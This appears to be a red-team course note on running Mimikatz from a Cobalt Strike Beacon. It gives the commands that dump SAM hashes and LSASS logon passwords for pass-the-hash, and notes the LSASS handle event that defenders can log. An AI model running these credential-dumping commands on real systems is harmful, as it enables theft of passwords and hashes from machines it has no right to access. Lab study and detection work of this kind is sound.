

Cannot run multiple commands like in console:

``PS C:\Tools\mimikatz\x64> .\mimikatz.exe token::elevate lsadump::sam exit``

Instead use :

`!` to elevate privilege
`@` impersonate Beacon's thread token before running the command

`@` option is useful in cases where Mimikatz needs to interact with a remote system, such as with dcsync.

So in the example above, the correct Cobalt Strike syntax would be:

``beacon> mimikatz !lsadump::sam``


## NTLM Hashes

Dump passwords from memory, even plaintext sometimes. Useful for **Pass the Hash**

```
mimikatz !sekurlsa::logonpasswords
```

> [!warning] 
> Requires elevated privileges.

Cobalt Strike also has a short-hand command for this called `logonpasswords`.  After dumping these credentials, go to _View > Credentials_ to see a copy of them

> [!danger] 
> OPSEC: This module will open a read handle to LSASS which can be logged under event 4656. Use the "Suspicious Handle to LSASS" saved search in Kibana to see them. 

